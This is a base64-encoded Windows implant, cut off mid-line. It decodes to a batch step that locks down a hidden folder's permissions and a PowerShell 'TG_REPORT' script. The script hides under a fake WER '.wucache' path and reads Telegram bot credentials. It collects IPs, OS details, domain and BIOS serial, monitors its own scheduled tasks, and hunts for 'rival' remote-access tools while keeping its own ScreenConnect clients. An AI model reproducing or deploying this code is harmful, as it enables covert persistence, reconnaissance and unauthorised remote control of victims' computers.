ZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0QgWSA+bnVs
IDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+JjENCmljYWNscyAiJVQl
IiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJV
c2VycyIgIkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJTlRF
UkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNiAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXA7IGR5bmFtaWMgZ3J5eGEgRlAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
ICR0cnVlKV1bc3RyaW5nXSRTdGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtz
dHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRl
bXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNl
dCgncmljaCcsICdjb21wYWN0JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmdd
JEJ1aWxkID0gJ08xNScsCiAgICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25Q
cmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2ls
ZW50bHlDb250aW51ZScKdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQ
cm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9Cgpm
dW5jdGlvbiBHZXQtQ2ZnIHsKICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnku
Y2ZnJwogICAgJGNmZyA9IEB7fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0
dXJuICRjZmcgfQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1P
YmplY3QgewogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMq
KC4qKVxzKiQnKSB7CiAgICAgICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0u
VHJpbSgpCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtz
dHJpbmddJHMpIHsKICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVy
biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNl
ICc+JywgJyZndDsnKQp9CgpmdW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUg
aW4gQCgKICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdo
dHRwczovL2lmY29uZmlnLm1lL2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNv
bScKICAgICAgICApKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2Vi
UmVxdWVzdCAtVXJpICR1IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAg
ICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAo
JGlwIC1tYXRjaCAnXlxkezEsM30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6Jykg
eyByZXR1cm4gJGlwIH0KICAgICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScK
fQoKZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1O
ZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAn
MTI3LionIC1hbmQgJF8uUHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAg
ICAgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAg
ICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQog
ICAgdHJ5IHsKICAgICAgICAkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFw
dGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBG
b3JFYWNoLU9iamVjdCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAk
XyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgk
aXBzKSB7IHJldHVybiAoKCRpcHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcp
IH0KICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZv
IHsKICAgICRvID0gW29yZGVyZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24g
PSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24v
YSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAn
bi9hJzsgTWFudWZhY3R1cmVyID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2En
CiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1Np
emVfR0IgPSAnbi9hJwogICAgfQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFu
Y2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9u
CiAgICAgICAgJG8uVmVyc2lvbiA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3Mu
QnVpbGROdW1iZXIKICAgICAgICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAg
JG8uSW5zdGFsbERhdGUgPSAoJG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCcpCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0
LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0Ig
PSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
Q29tcHV0ZXJTeXN0ZW0KICAgICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikg
eyAkY3MuRG9tYWluIH0gZWxzZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0
dXJlciA9ICRjcy5NYW51ZmFjdHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdp
bjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5h
bWUpCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2lt
SW5zdGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkg
ewogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIg
IkRldmljZUlEPSdDOiciCiAgICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRk
LkZyZWVTcGFjZSAvIDFHQiwgMSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91
bmQoJGQuU2l6ZSAvIDFHQiwgMSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5j
dGlvbiBHZXQtU3ZjTGluZShbc3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1O
YW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykg
eyByZXR1cm4gJ05PVCBJTlNUQUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScg
LWYgJHMuU3RhdHVzLCAkcy5TdGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtz
dHJpbmddJHRuKSB7CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZP
IExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91
dCkgewogICAgICAgIHJldHVybiBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lO
Ryc7IE5leHQgPSAnJzsgTGFzdCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAg
ICB9CiAgICAkbWFwID0gQHt9CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAi
JF8iIH0pIC1qb2luICJgbiIKICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBp
ZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAg
JG1hcFskbWF0Y2hlc1sxXS5UcmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgJHN0YXR1cyA9ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7
ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsg
JHN0YXR1cyA9ICdwcmVzZW50JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQog
ICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3Qg
UnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0
ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
JycgfQogICAgJHRyID0gJG1hcFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0
ciA9ICRtYXBbJ1Rhc2sgdG8gUnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kp
b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAg
IyBQcmVzZW50IFdpbmRvd3MgYnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkg
Zm9yIHVzCiAgICAkaGVhbHRoeSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8
UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAg
ICAgIFByZXNlbnQgPSAkdHJ1ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAg
IEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3Vycykg
eyAkc3RhdHVzIH0gZWxzZSB7ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQK
ICAgICAgICBMYXN0ICAgID0gJGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAg
IFRyICAgICAgPSAkKGlmICgkdHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0
aW9uIEdldC1SbW1IaXRzIHsKICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6
IFNjcmVlbkNvbm5lY3QgYWxsb3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5z
ID0gQCgKICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0Fn
ZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2lu
Vk5DJywgJ3ZuY3NlcnZlcicsICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1
c3REZXNrJywgJ1JlbW90ZVBDJywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdB
dGVyYScsICdOaW5qYVJNTScsICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScs
ICdBZ2VudE1vbicsICdQdWxzZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8n
LAogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENl
bnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lz
ZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAn
U2ltcGxlSGVscCcsICdCb21nYXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2gg
Q2VudHJhbCcsICdNZXNoIEFnZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxy
bW0nLCAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywK
ICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0Jywg
J0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAn
TmF2ZXJpc2snLCAnSW1teUJvdCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJl
cicsICdEb21vdHonLCAnQXV2aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQg
V29ya3BsYWNlJywgJ0dvdmVybGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQ
RFEgQ29ubmVjdCcsCiAgICAgICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdU
YWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcics
ICdBZXJvQWRtaW4nLAogICAgICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5l
JywgJ0lwZXJpdXMnLCAnSVNMIExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5D
JywgJ1JlYWxWTkMnCiAgICApCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0
YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1P
YmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9
IEB7fQoKICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkg
ewogICAgICAgICRrZXkgPSAiJGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAg
IGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRr
ZXldID0gJHRydWUKICAgICAgICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwv
Y29kZT4nIC1mICRraW5kLCAoRXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtl
ZXBOYW1lKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNl
IH0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVl
IH0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiok
ayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAg
R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgJG4gPSAkXy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAg
ICAgIGlmIChUZXN0LUtlZXBOYW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAg
ICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAt
b3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tl
ZXAtZGF0dG8nICgiJG4gKCQoJF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAg
IHJldHVybgogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAg
ICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAg
ICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAg
ICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3Mg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAg
JG4gPSAkXy5Qcm9jZXNzTmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVy
biB9CiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4g
LWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAg
ICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0
ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
cnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxN
aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZv
cmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRo
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAg
ICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0
dXJuIH0KICAgICAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAg
ICBpZiAoJGRuIC1saWtlICcqRGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykg
eyBBZGQtSGl0ICdrZWVwLWRhdHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAg
ICAgICAgIH0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJl
dHVybiB9CiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAg
ICAgIGlmICgkZG4gLWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAn
bXNpJyAkZG4KICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAg
ICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBH
ZXQtR3J5eGFLZWVwRnAgewogICAgJGZwID0gJzk5MDgxOThlNjY4ZTQ3NTAnCiAgICAkcCA9ICdD
OlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5j
ZmcnCiAgICBpZiAoJFdvcmtEaXIpIHsgJHAgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhLmNm
ZycgfQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsKICAgICAgICBHZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05
YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgICAg
ICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIEdldC1TY0luc3RhbGxzIHsKICAg
ICRncnl4YUZwID0gR2V0LUdyeXhhS2VlcEZwCiAgICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVt
LkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1Nj
cmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBp
ZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBl
bHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcn
KSB7ICdLRUVQLVNFVlJaJyB9CiAgICAgICAgZWxzZWlmICgkZnAgLWVxICdmODYxYzgxNDBkNDUz
NDI3JykgeyAnS0VFUC1BTFQnIH0KICAgICAgICBlbHNlaWYgKCRmcCAtZXEgJGdyeXhhRnApIHsg
J0tFRVAtR1JZWEEnIH0KICAgICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0KICAgICAgICBbdm9pZF0k
bGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2Mg
JF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQogICAgfQoKICAgICRy
b290cyA9IEAoCiAgICAgICAgIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGll
bnQqIiwKICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xp
ZW50KiIKICAgICkKICAgIGZvcmVhY2ggKCRwYXQgaW4gJHJvb3RzKSB7CiAgICAgICAgR2V0LUNo
aWxkSXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0
aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQogICAgICAgIH0KICAg
IH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FS
RVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxc
KicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRl
bVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2Jq
ZWN0IHsKICAgICAgICAgICAgJF8uRGlzcGxheU5hbWUgLWxpa2UgJypTY3JlZW5Db25uZWN0KicK
ICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRp
c3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9CiAgICAgICAg
ICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gbXNpOiA8Y29kZT57MH08L2NvZGU+IHZ7MX0nIC1mIChF
c2MgJF8uRGlzcGxheU5hbWUpLCAoRXNjICR2ZXIpKSkKICAgICAgICB9CiAgICB9CgogICAgaWYg
KCRsaXN0LkNvdW50IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9CiAgICBy
ZXR1cm4gJGxpc3QKfQoKJGNmZyA9IEdldC1DZmcKaWYgKC1ub3QgJGNmZy5CT1RfVE9LRU4gLW9y
IC1ub3QgJGNmZy5DSEFUX0lEKSB7CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4t
UGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAtVmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgZXhpdCAyCn0KCiRwcmltID0gJ1NjcmVlbkNvbm5l
Y3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScKJGFsdCA9ICdTY3JlZW5Db25uZWN0IENsaWVu
dCAoZjg2MWM4MTQwZDQ1MzQyNyknCiRvcyA9IEdldC1Pc0luZm8KJHdobyA9IFtTZWN1cml0eS5Q
cmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUKJGVsZXYgPSAoW1Nl
Y3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2lu
ZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZSgKICAgIFtTZWN1cml0eS5Qcmlu
